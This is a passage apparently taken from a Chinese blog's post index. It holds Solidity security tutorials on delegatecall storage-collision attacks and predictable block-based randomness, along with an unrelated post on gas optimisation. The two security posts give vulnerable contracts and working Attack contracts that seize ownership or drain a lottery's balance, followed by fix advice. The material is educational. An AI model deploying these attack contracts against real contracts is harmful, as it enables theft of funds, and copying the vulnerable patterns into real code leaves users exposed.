<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract A &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function test() public &#123;   // 这里方便演示漏洞效果使用public，实际中会有权限校验。</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    A public a;</span><br><span class="line"></span><br><span class="line">    constructor(A _a) &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        a = A(_a);   // 传入A合约的地址</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external  &#123;</span><br><span class="line">        address(a).delegatecall(msg.data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address public b;</span><br><span class="line"></span><br><span class="line">    constructor(address _b) &#123;</span><br><span class="line">        b = _b;    // 传入B合约的地址</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        b.call(abi.encodeWithSignature(&quot;test()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="delegatecall-漏洞进阶版"><a href="#delegatecall-漏洞进阶版" class="headerlink" title="delegatecall 漏洞进阶版"></a>delegatecall 漏洞进阶版</h3><p>先看代码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract A &#123;</span><br><span class="line">    uint public someNumber;</span><br><span class="line"></span><br><span class="line">    function doSomething(uint _num) public &#123;</span><br><span class="line">        someNumber = _num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B &#123;</span><br><span class="line">    address public a;    // slot 0</span><br><span class="line">    address public owner;   // slot 1</span><br><span class="line">    uint public someNumber;</span><br><span class="line"></span><br><span class="line">    constructor(address _a) &#123;</span><br><span class="line">        a = _a;    // 传入A合约的地址</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function doSomething(uint _num) public &#123;</span><br><span class="line">        a.delegatecall(abi.encodeWithSignature(&quot;doSomething(uint256)&quot;, _num));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address public a;    // slot 0</span><br><span class="line">    address public owner;  // slot 1</span><br><span class="line">    uint public someNumber;</span><br><span class="line"></span><br><span class="line">    B public b;</span><br><span class="line"></span><br><span class="line">    constructor(B _b) &#123;</span><br><span class="line">        b = B(_b);   // 传入B合约的地址</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        b.doSomething(uint(uint160(address(this))));   // 第一次调用替换B合约中的a地址为当前合约地址</span><br><span class="line">        b.doSomething(1);      // 第二次调用当前合约的doSomething()函数</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function doSomething(uint _num) public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>攻击流程：</p>
<ul>
<li>用户 部署 A 合约；</li>
<li>用户 部署 B 合约并在构造函数中传入 A 合约的地址；</li>
<li>攻击者 部署 Attack 合约并在构造函数中传入 B 合约的地址；</li>
<li>攻击者调用 Attack.attack() 函数将 B 合约中的 owner 变为自己。</li>
</ul>
<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
<li>在使用 delegatecall 时应注意被调用合约的地址不能是可控的；</li>
<li>在较为复杂的合约环境下需要注意变量的声明顺序以及存储位置。因为使用 delegatecall 进行外部调时会根据被调用合约的数据结构来用修改本合约相应 slot 中存储的数据，在数据结构发生变化时这可能会造成非预期的变量覆盖。</li>
</ul>
]]></content>
      <tags>
        <tag>Solidity</tag>
        <tag>智能合约安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Gas优化（一）</title>
    <url>/2024/04/13/GAS%E4%BC%98%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<p>以太坊网络上的每个操作，从简单的转账到复杂的合约交互，都需要消耗Gas。Gas机制不仅防止了网络资源的滥用，还通过设置交易的 Gas Limit 确保每个操作计算资源使用在合理范围内，从而保障网络的安全性和稳定性。</p>
<h2 id="存储优化"><a href="#存储优化" class="headerlink" title="存储优化"></a>存储优化</h2><h3 id="减少存储变量的读取"><a href="#减少存储变量的读取" class="headerlink" title="减少存储变量的读取"></a>减少存储变量的读取</h3><p>读取存储变量至少需要100gas（在EVM中，每次第一次访问任何存储变量时都必须付费，这称为“冷”访问，需要花费2100个gas。第二次或连续一次被称为“热”访问，需要花费 100 Gas。），因为Solidity不会缓存存储读取。<br>如下例子中存储变量<code>_decimalsETH</code>被重复读取</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getTokensFromUSD(</span><br><span class="line">    address _tokenAddress,</span><br><span class="line">    uint256 _usdValue</span><br><span class="line">)</span><br><span class="line">    external</span><br><span class="line">    view</span><br><span class="line">    returns (uint256)</span><br><span class="line">&#123;</span><br><span class="line">    uint8 tokenDecimals = _tokenDecimals[</span><br><span class="line">        _tokenAddress</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    return _decimalsETH &lt; tokenDecimals     //第一次</span><br><span class="line">        ? _usdValue</span><br><span class="line">            * 10 ** (tokenDecimals - _decimalsETH)   //第二次</span><br><span class="line">            * 10 ** decimals(_tokenAddress)</span><br><span class="line">            / latestResolver(_tokenAddress)</span><br><span class="line">        : _usdValue</span><br><span class="line">            * 10 ** decimals(_tokenAddress)</span><br><span class="line">            / latestResolver(_tokenAddress)</span><br><span class="line">            / 10 ** (_decimalsETH - tokenDecimals);   //第二次</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>采用临时变量来缓存存储变量节省gas。</p>
<h3 id="使用存储指针"><a href="#使用存储指针" class="headerlink" title="使用存储指针"></a>使用存储指针</h3><p>将整个结构体从存储中复制到内存中，包含了不需要的变量。而使用存储指针，通过引用传递只进行一次存储加载而不需要再从内存复制回存储中。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function increaseReservedForCompound(</span><br><span class="line">    address _pendleMarket,</span><br><span class="line">    uint256[] calldata _amounts</span><br><span class="line">)</span><br><span class="line">    external</span><br><span class="line">    onlyChildContract(_pendleMarket)</span><br><span class="line">&#123;</span><br><span class="line">    CompoundStruct memory childInfo = pendleChildCompoundInfo[</span><br><span class="line">        _pendleMarket</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    uint256 i;</span><br><span class="line">    uint256 length = childInfo.rewardTokens.length;</span><br><span class="line"></span><br><span class="line">    while (i &lt; length) &#123;</span><br><span class="line">        childInfo.reservedForCompound[i] += _amounts[i];</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pendleChildCompoundInfo[_pendleMarket] = childInfo;</span><br><span class="line"></span><br><span class="line">    emit IncreaseReservedForCompound(</span><br><span class="line">        _pendleMarket,</span><br><span class="line">        _amounts</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>将<code>memery</code>改为<code>storage </code>，并删除<code>pendleChildCompoundInfo[_pendleMarket] = childInfo;</code>.</p>
<h3 id="减少0值写入"><a href="#减少0值写入" class="headerlink" title="减少0值写入"></a>减少0值写入</h3><p>在存储变量做计算赋值时，应避免0的计算。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function increaseIncentiveA(</span><br><span class="line">    uint256 _value</span><br><span class="line">)</span><br><span class="line">    external</span><br><span class="line">    onlyIncentiveMaster</span><br><span class="line">&#123;</span><br><span class="line">    incentiveUSD[incentiveOwnerA] += _value;</span><br><span class="line"></span><br><span class="line">    emit IncentiveIncreasedA(</span><br><span class="line">        _value,</span><br><span class="line">        block.timestamp</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>_value</code>如果为0，<code>incentiveUSD[incentiveOwnerA]</code>并没有发生变化，可以不进行加法运算，减少存储变量的读写操作。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">error ZeroValue();</span><br><span class="line">if(_value == 0) &#123;</span><br><span class="line">    revert ZeroValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>先<code>_value</code>判断是否为0，再进行加法操作。</p>
<h3 id="只读参数使用calldata比memory便宜"><a href="#只读参数使用calldata比memory便宜" class="headerlink" title="只读参数使用calldata比memory便宜"></a>只读参数使用calldata比memory便宜</h3><p>直接从calldata中加载函数输入或数据比从内存中加载更便宜，因为从calldata访问数据涉及的操作和gas成本较少。因此，建议仅在函数需要修改数据时使用memory（calldata无法修改）。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function setBaseURI(</span><br><span class="line">    string memory _newBaseURI   // 用calldata代替memory</span><br><span class="line">)</span><br><span class="line">    external</span><br><span class="line">    onlyMaster</span><br><span class="line">&#123;</span><br><span class="line">    baseURI = _newBaseURI;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="变量优化"><a href="#变量优化" class="headerlink" title="变量优化"></a>变量优化</h2><p>Solidity中使用连续的插槽（32字节slot）来存储变量。当存储变量远小于32字节时，可以将多个32字节的存储变量打包到同一个插槽中优化gas使用。如果我们试图打包的变量超过当前槽的32字节限制，它将被存储在一个新的插槽中。<br><strong>值类型：</strong><br>整型(int&#x2F;uint)   uint256 32字节      (另外，enum枚举类型会被编译器自动转换成uint8类型)<br>地址类型(address)  address 20字节<br>布尔类型(bool)    bool 1字节<br>字节类型(byte)  bytes1 bytes2 bytes3 … bytes32  1~32字节<br>定长数组(uint[3],byte[2]..),  字节大小根据实际长度计算</p>
<p>映射和动态数组的大小是不可预知的，它们本身只占32个字节，它们所包含的元素被存储在不同的存储槽，该存储槽是用Keccak-256哈希计算而来。<br><strong>引用类型：</strong>（占用字节数需要具体计算）<br>动态数组(uint[], byte[], string, address[]…)<br>映射(mapping)<br>结构体(struct) </p>
<h3 id="打包存储变量"><a href="#打包存储变量" class="headerlink" title="打包存储变量"></a>打包存储变量</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">address public pool;</span><br><span class="line">uint256 public totalDebt;</span><br><span class="line">bool public strategyActive;</span><br></pre></td></tr></table></figure></div>
<p>由于以上布局会使用3个插槽，调整布局进行变量打包，会把strategyActive和pool打包到1个插槽里，从而节省gas。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">address public pool;</span><br><span class="line">bool public strategyActive;</span><br><span class="line">uint256 public totalDebt;</span><br></pre></td></tr></table></figure></div>
<p>打包后，会使用2个插槽。</p>
<h3 id="打包结构体成员变量"><a href="#打包结构体成员变量" class="headerlink" title="打包结构体成员变量"></a>打包结构体成员变量</h3><p>在Solidity中，结构体成员从初始化的槽位置开始按顺序存储在合约的存储中。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct PositionPreview &#123; //  can be tightly packed by moving borrowType and liquidatable at the end</span><br><span class="line">    address owner;</span><br><span class="line">    uint256 nftIndex;</span><br><span class="line">    bytes32 nftType;</span><br><span class="line">    uint256 nftValueUSD;</span><br><span class="line">    VaultSettings vaultSettings;</span><br><span class="line">    uint256 creditLimit;</span><br><span class="line">    uint256 debtPrincipal;</span><br><span class="line">    uint256 debtInterest; //  32 bytes</span><br><span class="line">    BorrowType borrowType; //  1 byte (this enum is equivalent to uint8 as it has less than 256 options)</span><br><span class="line">    bool liquidatable; //   1 byte</span><br><span class="line">    uint256 liquidatedAt; // 32 bytes</span><br><span class="line">    address liquidator; // 20 bytes</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>打包成员变量，可以节省gas。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct PositionPreview &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    uint256 nftIndex;</span><br><span class="line">    bytes32 nftType;</span><br><span class="line">    uint256 nftValueUSD;</span><br><span class="line">    VaultSettings vaultSettings;</span><br><span class="line">    uint256 creditLimit;</span><br><span class="line">    uint256 debtPrincipal;</span><br><span class="line">    uint256 debtInterest; //  32 bytes</span><br><span class="line">    uint256 liquidatedAt; //  32 bytes</span><br><span class="line">    BorrowType borrowType; // 1 byte (this enum is equivalent to uint8 as it has less than 256 options)</span><br><span class="line">    bool liquidatable; //  1 byte</span><br><span class="line">    address liquidator; //  20 bytes</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>




<h2 id="函数优化"><a href="#函数优化" class="headerlink" title="函数优化"></a>函数优化</h2><h3 id="使用函数命名式-returns-返回值"><a href="#使用函数命名式-returns-返回值" class="headerlink" title="使用函数命名式(returns)返回值"></a>使用函数命名式(returns)返回值</h3><p>Solidity中两个关键字：<code>return</code>和<code>returns</code>，区别是：</p>
<ul>
<li><code>return</code>: 在函数主体中，用于返回指定的变量；</li>
<li><code>returns</code>: 加在函数名后面，用于生命返回的变量类型及变量名。</li>
</ul>
<p>在returns中标明返回变量的名称，这样solidity会自动给这些变量初始化，并且自动返回这些函数的值，不需要加return。每个变量可以节省9gas。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract TestContract  &#123;</span><br><span class="line">    function NoNamedReturn(uint256[] calldata inputs) </span><br><span class="line">        external </span><br><span class="line">        pure </span><br><span class="line">        returns(uint256) </span><br><span class="line">    &#123;</span><br><span class="line">        uint256 sum;</span><br><span class="line"></span><br><span class="line">        for(uint256 i; i&lt;inputs.length; i++) &#123;</span><br><span class="line">            sum += inputs[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function UsingNamedReturn(uint256[] calldata inputs) </span><br><span class="line">        external </span><br><span class="line">        pure </span><br><span class="line">        returns(uint256 sum) </span><br><span class="line">    &#123;</span><br><span class="line">        for(uint256 i; i&lt;inputs.length; i++) &#123;</span><br><span class="line">            sum += inputs[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="合并仅调用一次的internal函数"><a href="#合并仅调用一次的internal函数" class="headerlink" title="合并仅调用一次的internal函数"></a>合并仅调用一次的internal函数</h3><p>当某个被调用函数仅调用一次时，可以重构并合并到调用函数当中，函数调用会增加额外的堆栈和JUMP指令等开销。<br><strong>注：这可能会影响代码原有结构，适用于代码量少的函数，慎用。</strong></p>
<h2 id="修饰符优化"><a href="#修饰符优化" class="headerlink" title="修饰符优化"></a>修饰符优化</h2><h3 id="选择合适的变量可见性"><a href="#选择合适的变量可见性" class="headerlink" title="选择合适的变量可见性"></a>选择合适的变量可见性</h3><p>避免使用公共变量（public），公共变量隐式创建一个getter函数，这可能会增加合约的大小和Gas使用。</p>
<p>父合约<code>contracts/WiseLendingDeclaration.sol</code>定义存储变量：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mapping(uint256 =&gt; address[]) public positionLendTokenData;</span><br></pre></td></tr></table></figure></div>
<p>子合约<code>contracts/WiseLowLevelHelper.sol</code>使用：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getPositionLendingTokenByIndex(</span><br><span class="line">    uint256 _nftId,</span><br><span class="line">    uint256 _index</span><br><span class="line">)</span><br><span class="line">    public</span><br><span class="line">    view</span><br><span class="line">    returns (address)</span><br><span class="line">&#123;</span><br><span class="line">    return positionLendTokenData[_nftId][_index];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>将<code>public</code>修饰符改为<code>internal</code>：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mapping(uint256 =&gt; address[]) internal positionLendTokenData;</span><br></pre></td></tr></table></figure></div>

<h3 id="使用-payable-函数"><a href="#使用-payable-函数" class="headerlink" title="使用 payable 函数"></a>使用 payable 函数</h3><p>payable函数比非payable函数消耗更少的gas，因为payable函数允许用户在调用函数时传递非0或0ETH，而不需要检查ETH转账。<br><strong>注：虽然节省gas很重要，如果一个函数与接收ETH无关，即使能节省gas也不应附加任何payable修饰符。</strong></p>
<h2 id="编译器优化"><a href="#编译器优化" class="headerlink" title="编译器优化"></a>编译器优化</h2><h3 id="unchecked除法"><a href="#unchecked除法" class="headerlink" title="unchecked除法"></a>unchecked除法</h3><p>从 Solidity 0.8.0 版本开始，所有的算术运算默认就会进行溢出检查。Unchecked 代码块，提示编译器不安全地执行算术操作。前提是保证 unchecked 代码块中的内容能够安全的执行，从而可以节省Gas成本。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 private constant ONE_WEEK = 7 days;</span><br><span class="line">function previewDistribution()</span><br><span class="line">    public</span><br><span class="line">    view</span><br><span class="line">    returns (uint256)</span><br><span class="line">&#123;</span><br><span class="line">    if (totalLpAssetsToDistribute == 0) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (block.timestamp == lastInteraction) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (totalLpAssetsToDistribute &lt; ONE_WEEK) &#123;</span><br><span class="line">        return totalLpAssetsToDistribute;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint256 currentRate = totalLpAssetsToDistribute</span><br><span class="line">        / ONE_WEEK;                      // unckecked</span><br><span class="line"></span><br><span class="line">    uint256 additonalAssets = currentRate</span><br><span class="line">        * (block.timestamp - lastInteraction);</span><br><span class="line"></span><br><span class="line">    if (additonalAssets &gt; totalLpAssetsToDistribute) &#123;</span><br><span class="line">        return totalLpAssetsToDistribute;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return additonalAssets;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>分母为0或负数的情况，以上代码不需要检查，添加unchecked可以节省Gas。</p>
]]></content>
      <tags>
        <tag>智能合约安全审计</tag>
        <tag>Solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>随机数攻击</title>
    <url>/2023/06/24/%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>随机数攻击，就是针对智能合约的随机数生成算法进行攻击，预测智能合约的随机数。</p>
<p>常见的随机数获取有两种方式：使用区块变量生成随机数，使用预言机生成随机数。</p>
<p><strong>区块链变量生成随机数</strong></p>
<p>常见的区块链变量如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">block.basefee(uint)： 当前区块的基本费用</span><br><span class="line">block.chainid(uint)： 当前链id</span><br><span class="line">block.coinbase(address payable)： 当前区块矿工地址</span><br><span class="line">block.difficulty(uint)： 当前区块难度</span><br><span class="line">block.gaslimit(uint)： 当前区块gaslimit</span><br><span class="line">block.number(uint)： 当前区块号</span><br><span class="line">block.timestamp(uint)： 自Unix纪元以来的当前区块时间戳（以秒为单位）</span><br><span class="line">blockhash(uint blockNumber) returns (bytes32)： 给定区块的哈希，仅适用于256个最近的区块</span><br></pre></td></tr></table></figure></div>
<p>由区块数据生成的随机数可能会限制普通用户预测随机数的可能性，但是并不能限制矿工作恶，矿工可以决定一个区块是否被广播，他们挖出了一个区块不是一定要广播出去也可以直接扔掉，这个就叫矿工的选择性打包。他们可以持续尝试生成随机数，直至得到想要的结果再广播出去。当然，旷工会这样做的前提是有足够的利益诱惑，例如可以获得一个很大的奖励池中的奖励，因此使用区块变量获取随机数的方法更适用于一些随机数不属于核心业务的应用。</p>
<p><strong>预言机生成随机数</strong></p>
<p>预言机是专门为生成随机数种子而搭建的链上或者链下的服务。除了使用第三方服务，也可以由 DApp 开发商自己搭建一个链下服务提供随机数，这种在链上获取链下数据的场景通常是通过链上预言机的方式来实现。</p>
<p>当然这种方法也会有一些安全风险，例如依赖第三方给出的随机数种子的话同样会存在第三方作弊或者受贿的情形，即使是自己搭建的随机数服务也可能因为故障等原因无法使用，项目方也有可能操控随机数对 DApp 的运行和用户造成重大的损失。因此使用链下服务获取随机数的方法依赖于是否有一个可信又稳定的第三方服务，如果有，那么这个方法相较于使用区块链变量生成随机数的方法，随机数的不可预测性会更强一些。</p>
<h3 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>猜数字游戏，玩家通过调用合约 mint() 函数，函数会产生一个随机数，如果随机数为奇数，表示中奖，会给于 1 ether 作为奖励；如果随机数为偶数，表示没有中奖。以下是漏洞代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract Random &#123;</span><br><span class="line">    event Log(string);</span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function _getRandom() private view returns(bool) &#123;</span><br><span class="line">        uint256 random = uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp)));</span><br><span class="line">        if(random%2 == 0) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint() public payable returns(bool randLucky) &#123;</span><br><span class="line">        randLucky = _getRandom();</span><br><span class="line">        if (randLucky == true) &#123;</span><br><span class="line">            require(payable(msg.sender).send(1 ether));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>以上代码实现使用了区块链变量来生成随机数的算法， 这里生成的随机数是可以被攻击预测到的，并可以清空受害合约的余额。<br>攻击合约使用死循环，不断判断受害合约的余额，直到取光所有的 ETH 。以下攻击代码：<br>如计算结果为偶数，需等待下一个区块；<br>如计算结果为奇数，保证获取奖励，并取走所有余额。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    event Log(string);</span><br><span class="line">    receive() external payable &#123; &#125;</span><br><span class="line"></span><br><span class="line">    function attack(address _random) external payable &#123;</span><br><span class="line">        for (;;) &#123;</span><br><span class="line">            if (_random.balance &lt; 1 ether) &#123;</span><br><span class="line">                emit Log(&quot;balance not enugh.&quot;);</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp))) % 2 == 0) &#123;</span><br><span class="line">                emit Log(&quot;failed to get rand number.&quot;);</span><br><span class="line">                return ;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            (bool ok, ) = _random.call(abi.encodeWithSignature(&quot;mint()&quot;));</span><br><span class="line">            if(!ok)&#123;</span><br><span class="line">                emit Log(&quot;failed to call mint().&quot;);</span><br><span class="line">                return ;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                emit Log(&quot;get reward success.&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p><strong>外部随机数生成器：</strong> 利用外部随机数生成服务，例如Chainlink VRF（Verifiable Random Function），提供真实随机数并且具备可验证的特性。<br><strong>多源输入：</strong> 将多个来源的数据组合生成随机数，例如区块链属性、用户输入，以及合约状态的混合使用，提升不可预测性。<br><strong>时间延迟：</strong> 不马上使用生成的随机数，而是等几个区块之后再使用，以增加干扰概率，降低操控的可能性。<br><strong>密码学方法：</strong> 使用密码学安全的随机数生成算法，确保攻击者无法逆推出初始状态或预测生成结果。</p>
]]></content>
      <tags>
        <tag>Solidity</tag>
        <tag>智能合约安全</tag>
      </tags>
  </entry>
</search>
